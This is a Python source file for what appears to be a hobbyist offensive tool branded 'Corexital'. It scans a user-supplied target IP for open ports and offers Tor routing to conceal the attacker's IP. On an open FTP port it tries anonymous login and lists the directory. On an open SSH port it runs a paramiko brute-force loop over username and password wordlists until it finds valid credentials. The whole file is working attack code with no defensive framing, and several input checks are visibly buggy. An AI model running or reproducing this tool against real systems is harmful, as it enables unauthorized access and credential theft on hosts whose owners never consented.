import os
import socket
import sys
import requests
import socks
import paramiko
import termcolor
from ftplib import FTP
import threading
from queue import Queue
import time
from datetime import datetime
from colorama import init, Fore, Style
import subprocess

init(autoreset=True)
subprocess.call('clear', shell=True)


def attack():
    q.task_done()
    usr_arr = [];
    pass_arr = []
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        user_list = os.path.abspath('users.txt')
        pass_list = file = os.path.abspath('passes.txt')
        print(termcolor.colored("[+] BruteForce Started....", 'blue'))
        print('\n')
    except KeyboardInterrupt:
        print(termcolor.colored("CANCELLED", 'red'))
        quit()

    users_lis = open(user_list, "r")
    for l in users_lis:
        u = l.strip();
        usr_arr.append(u)
    users_lis.close()

    passwords = open(pass_list, "r")
    for l in passwords:
        p = l.strip();
        pass_arr.append(p)
    passwords.close()
    i = 1;
    x = 0;
    u = 0
    while i == 1:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print("[*] Username:", str(usr_arr[u]), "| [*] Password:", str(pass_arr[x]))
            client.connect(username=usr_arr[u], hostname=hack, password=pass_arr[x], port=22)
            print(termcolor.colored("[✔] Valid Credentials Found\n", 'cyan'))
            break
        except (paramiko.ssh_exception.AuthenticationException):
            print(termcolor.colored("[X] Password Not Found!\n", 'red'));
            time.sleep(0.2)
            if x == len(pass_arr) - 1:
                x = 0
                if u == len(usr_arr) - 1:    break
                u += 1
            else:
                x += 1
            continue
        except paramiko.ssh_exception.NoValidConnectionsError:
            print(termcolor.colored("Host Error or May Be something\n", 'red'))
            quit()
        except:
            time.sleep(0.3);
            continue
        i += 1

print(Style.BRIGHT + Fore.YELLOW + "START AT:", (datetime.now()))
print("=============COREXITAL PORT SCANNER=============")
print("")
target = input("ENTER TARGET IP:  ")
ports = input("ENTER NUMBER OF PORTS TO SCAN:   ")
threads = input("ENTER NUMBER OF THREADS (MAXIMUM: 3)   ")
if threads=="1":
    thr = 1
if threads=="2":
    thr = 2
if threads=="3":
    thr = 3
else:
    print("INVALID INPUT!!!")
    print("ERROR: QUITTING....")
    sys.exit()
hack = socket.gethostbyname(target)

todo = input("USE TOR? Y/N:   ")

if todo =="Y":
    r = requests.get('http://wtfismyip.com/text')
    print(Style.BRIGHT + Fore.BLUE + "CURRENT IP:", r.text)  # prints my ordinary IP address
    print("CONNECTING TO TOR.....")
    socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
    socket.socket = socks.socksocket
    r = requests.get('http://wtfismyip.com/text')
    print(Style.BRIGHT + Fore.BLUE + "CONNECTED VIA:", r.text)
    if r.status_code == 200:
        print(Style.BRIGHT + Fore.YELLOW + "PROXY STATUS:", Style.BRIGHT + Fore.GREEN + "OK")
    else:
        print(Style.BRIGHT + Fore.YELLOW + "PROXY STATUS:", Style.BRIGHT + Fore.RED + "BAD")
if todo =="N":
    r = requests.get('http://wtfismyip.com/text')
    print(Style.BRIGHT + Fore.BLUE + "CURRENT IP:", r.text)
    print(Style.BRIGHT + Fore.RED + "NOT CONNECTED TO TOR!!")
else:
    print("INVALID INPUT!!!")
    print("ERROR: QUITTING....")
    sys.exit()
num = int(ports)
print("Starting at: ")

t1 = datetime.now()
print(t1)




print(Style.BRIGHT + Fore.YELLOW + "SCANNING:", target)
print("WAITING FOR RESULTS...")
######################### Fuctions: def means Define. functions are called with the () characters##############
def starthack(port):

        hacking = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        hacking.settimeout(10)
        try:
            result = hacking.connect_ex((hack, port))
            if result ==0:
                service = socket.getservbyport(port)
                print("-----------------------------------------")
                print(Style.BRIGHT + Fore.YELLOW + "PORT:", port, Style.BRIGHT + Fore.GREEN + "    OPEN")
                print("SERVICE:", service)
                print("-----------------------------------------")
                hacking.close()

                print("")
                print("")
                if port ==21:
                    print("FTP IS OPEN!! ")
                    print("CHECKING FOR ANONYMOUS AUTHENTICATION")
                    ftp = FTP(hack)
                    ftp.login()
                    print("DIRECTORY CONTENTS: ")
                    ftp.retrlines('LIST')
                    choice = input("EXIT? Y/N:  ")
                    if choice =="Y":
                        ftp.quit()
                    if choice =="N":
                        ftp.retrlines('LIST')
                    else:
                        print("")
                        print("INVALID INPUT!!!")
                        print("ERROR: QUITTING....")
                        sys.exit()
                if port ==22:
                    print("SSH IS OPEN!!")
                    print("ATTEMPTING BRUTEFORCE ATTACK")

                    attack()

            else:
                print("-----------------------------------------")
                print(Style.BRIGHT + Fore.YELLOW + "PORT:", port, Style.BRIGHT + Fore.RED +"    CLOSED")
                print("-----------------------------------------")
                hacking.close()

                print("")
                print("")

        except KeyboardInterrupt:
            print(t1)
            print("Canceled")
            sys.exit()

        except socket.gaierror:
            print(t1)
            print("Hostname could not be resolved. Exiting")
            sys.exit()
        except socket.error:
            print(t1)
            print("Error")
            print("ERROR")
            sys.exit()


def threader():
    while True:
        # gets a worker from the queue
        worker = q.get()

        # Run the example job with the available
        # worker in queue (thread)
        starthack(worker)

        # completed with the job
        q.task_done()


# Creating the queue and threader
q = Queue()

# number of threads are we going to allow for
for x in range(thr):
    t = threading.Thread(target=threader)

    # classifying as a daemon, so they it will
    # die when the main dies
    t.daemon = False

    # begins, must come after daemon definition
    t.start()

start = time.time()

# 10 jobs assigned.
for worker in range(1, num):
    q.put(worker)

# wait till the thread terminates.
q.join()
print("FINISHED SCANNING TARGET:", target)
os.system('date')
print(Style.BRIGHT + Fore.YELLOW + "END OF REPORT")
print("2023 - Corexital")
